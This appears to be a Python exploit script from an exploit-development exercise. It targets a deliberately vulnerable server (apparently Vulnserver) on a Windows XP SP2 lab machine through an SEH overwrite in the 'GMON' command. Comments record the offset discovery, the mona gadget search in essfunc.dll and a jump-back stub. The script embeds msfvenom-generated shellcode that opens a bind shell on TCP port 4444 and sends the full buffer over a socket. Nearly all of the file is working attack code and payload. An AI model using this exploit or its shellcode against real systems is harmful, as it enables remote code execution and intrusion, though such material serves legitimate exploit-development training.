#!/usr/bin/python

import socket

server = '172.16.102.142' # Change to the IP Address of Windows XP SP2 VM
destPort = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, destPort))

# http://resources.infosecinstitute.com/seh-exploit/

#bufCreated = "A"*4000
# /usr/share/metasploit-framework/tools/pattern_create.rb 4000
pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2F"

#bufCreated = pattern

# SEH was overwritten with the pattern 6d45376d
# /usr/share/metasploit-framework/tools/pattern_offset.rb 6d45376d
# [*] Exact match at offset 3502

# After placing mona.py in the c:\program files\imunnity debugger\..\pycommands folder
# Attach to vulnerable server
# !mona config -set workingfolder c:\logs\%p
# The above command outputs the location where mona will save its logs
# Verify the folder exists that you point to
# !mona seh  OR !mona seh -all
# After this has completed running it will output to the working folder
# Inside the file you find the following line:
# 0x625010b4 : pop ebx pop ebp ret {page_executed_read} essfunc.dll

# Without Shellcode
#bufCreated = "A"*3498
#bufCreated += "\xeb\x0f\x90\x90" # JMP (0xeb) 0f NOP NOP
#bufCreated += "\xb4\x10\x50\x62" - SEH from essfunc.dll
#bufCreated += "\x59\xfe\xcd\xfe\xcd\xfe\xcd\xff\xe1\xe8\xf2\xff\xff\xff"
# \x59 POP ECX
# \xfe\xcd DEC CH
# \xfe\xcd DEC CH
# \xfe\xcd DEC CH
# \xff\xe1 JMP ECX
# \xe8\xf2\xff\xff\xff CALL [relative -0D]
#bufCreated += "\xcc"*(4000 - len(bufCreated))

# msfvenom -p windows/shell_bind_tcp LPORT=4444 EXITFUNC=seh -b '\x00\x20\x0a\x0d' -f python
# No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# No Arch selected, selecting Arch: x86 from the payload
# Found 22 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 355 (iteration=0)
buf =  ""
buf += "\xb8\xa7\xd8\x16\xa4\xd9\xc1\xd9\x74\x24\xf4\x5b\x31"
buf += "\xc9\xb1\x53\x83\xc3\x04\x31\x43\x0e\x03\xe4\xd6\xf4"
buf += "\x51\x16\x0e\x7a\x99\xe6\xcf\x1b\x13\x03\xfe\x1b\x47"
buf += "\x40\x51\xac\x03\x04\x5e\x47\x41\xbc\xd5\x25\x4e\xb3"
buf += "\x5e\x83\xa8\xfa\x5f\xb8\x89\x9d\xe3\xc3\xdd\x7d\xdd"
buf += "\x0b\x10\x7c\x1a\x71\xd9\x2c\xf3\xfd\x4c\xc0\x70\x4b"
buf += "\x4d\x6b\xca\x5d\xd5\x88\x9b\x5c\xf4\x1f\x97\x06\xd6"
buf += "\x9e\x74\x33\x5f\xb8\x99\x7e\x29\x33\x69\xf4\xa8\x95"
buf += "\xa3\xf5\x07\xd8\x0b\x04\x59\x1d\xab\xf7\x2c\x57\xcf"
buf += "\x8a\x36\xac\xad\x50\xb2\x36\x15\x12\x64\x92\xa7\xf7"
buf += "\xf3\x51\xab\xbc\x70\x3d\xa8\x43\x54\x36\xd4\xc8\x5b"
buf += "\x98\x5c\x8a\x7f\x3c\x04\x48\xe1\x65\xe0\x3f\x1e\x75"
buf += "\x4b\x9f\xba\xfe\x66\xf4\xb6\x5d\xef\x39\xfb\x5d\xef"
buf += "\x55\x8c\x2e\xdd\xfa\x26\xb8\x6d\x72\xe1\x3f\x91\xa9"
buf += "\x55\xaf\x6c\x52\xa6\xe6\xaa\x06\xf6\x90\x1b\x27\x9d"
buf += "\x60\xa3\xf2\x08\x68\x02\xad\x2e\x95\xf4\x1d\xef\x35"
buf += "\x9d\x77\xe0\x6a\xbd\x77\x2a\x03\x56\x8a\xd5\x3a\xfb"
buf += "\x03\x33\x56\x13\x42\xeb\xce\xd1\xb1\x24\x69\x29\x90"
buf += "\x1c\x1d\x62\xf2\x9b\x22\x73\xd0\x8b\xb4\xf8\x37\x08"
buf += "\xa5\xfe\x1d\x38\xb2\x69\xeb\xa9\xf1\x08\xec\xe3\x61"
buf += "\xa8\x7f\x68\x71\xa7\x63\x27\x26\xe0\x52\x3e\xa2\x1c"
buf += "\xcc\xe8\xd0\xdc\x88\xd3\x50\x3b\x69\xdd\x59\xce\xd5"
buf += "\xf9\x49\x16\xd5\x45\x3d\xc6\x80\x13\xeb\xa0\x7a\xd2"
buf += "\x45\x7b\xd0\xbc\x01\xfa\x1a\x7f\x57\x03\x77\x09\xb7"
buf += "\xb2\x2e\x4c\xc8\x7b\xa7\x58\xb1\x61\x57\xa6\x68\x22"
buf += "\x69\x56\xa0\xbf\xfe\xc1\x51\x82\x62\xf2\x8c\xc1\x9a"
buf += "\x71\x24\xba\x58\x69\x4d\xbf\x25\x2d\xbe\xcd\x36\xd8"
buf += "\xc0\x62\x36\xc9"



# With Shellcode
bufCreated = "\x90"*2752
bufCreated += buf
bufCreated += "\x90"*(3498 - len(bufCreated))
bufCreated += "\xeb\x0f\x90\x90" # JMP (0xeb) 0f NOP NOP
bufCreated += "\xb4\x10\x50\x62" # SEH from essfunc.dll  POP EBX, POP EBP, RETN - Works
bufCreated += "\x59\xfe\xcd\xfe\xcd\xfe\xcd\xff\xe1\xe8\xf2\xff\xff\xff"
# \x59 POP ECX
# \xfe\xcd DEC CH
# \xfe\xcd DEC CH
# \xfe\xcd DEC CH
# \xff\xe1 JMP ECX
# \xe8\xf2\xff\xff\xff CALL [relative -0D]
bufCreated += "\x90"*(4000 - len(bufCreated))

# Receive the Banner that is returned after the initial connection
print s.recv(1024)

# Send the username to login with
userString = "GMON /" + bufCreated
s.send(userString)
print userString
print s.recv(1024)

s.close()
